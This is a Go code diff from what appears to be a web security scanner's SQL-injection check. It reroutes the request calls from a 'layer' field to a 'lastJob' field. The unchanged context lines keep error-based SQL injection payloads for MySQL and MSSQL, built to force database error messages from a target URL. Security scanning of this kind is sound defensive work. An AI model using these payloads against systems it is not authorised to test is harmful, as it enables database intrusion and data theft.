@@ -109,8 +109,8 @@ type classSQLErrorMessages struct {
 	plainArray               []string
 	regexArray               []string
 	FalsePositivesPlainArray []string
-	lastJob                  LastJob
-	layer                    *layers.Plreq
+	lastJob                  *layers.LastJob
+	// layer                    *layers.Plreq
 }
 
 func (errsql *classSQLErrorMessages) IsFalsePositive(text string) bool {
@@ -181,7 +181,7 @@ func (errsql *classSQLErrorMessages) TestInjection(index int, value string, conf
 				markerEncodedMYSQL +
 				`) from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a)and` +
 				data
-			body_Feature, err := errsql.layer.RequestByIndex(index, errsql.TargetUrl, confirmValue)
+			body_Feature, err := errsql.lastJob.RequestByIndex(index, errsql.TargetUrl, confirmValue)
 			if err != nil {
 				return false
 			}
@@ -195,7 +195,7 @@ func (errsql *classSQLErrorMessages) TestInjection(index int, value string, conf
 				markerEncodedMYSQL +
 				`),floor(rand()*2))x from (select 1 union select 2)a group by x limit 1))` +
 				data
-			body_Feature, err = errsql.layer.RequestByIndex(index, errsql.TargetUrl, confirmValue)
+			body_Feature, err = errsql.lastJob.RequestByIndex(index, errsql.TargetUrl, confirmValue)
 			if err != nil {
 				return false
 			}
@@ -208,7 +208,7 @@ func (errsql *classSQLErrorMessages) TestInjection(index int, value string, conf
 			} else {
 				confirmValue = data + `(select convert(int,` + markerEncodedMSSQL + `) FROM syscolumns)` + data
 			}
-			body_Feature, err = errsql.layer.RequestByIndex(index, errsql.TargetUrl, confirmValue)
+			body_Feature, err = errsql.lastJob.RequestByIndex(index, errsql.TargetUrl, confirmValue)
 			if err != nil {
 				return false
 			}
@@ -221,7 +221,7 @@ func (errsql *classSQLErrorMessages) TestInjection(index int, value string, conf
 			} else {
 				confirmValue = data + `convert(int,` + markerEncodedMSSQL + `)` + data
 			}
-			body_Feature, err = errsql.layer.RequestByIndex(index, errsql.TargetUrl, confirmValue)
+			body_Feature, err = errsql.lastJob.RequestByIndex(index, errsql.TargetUrl, confirmValue)
 			if err != nil {
 				return false
 			}
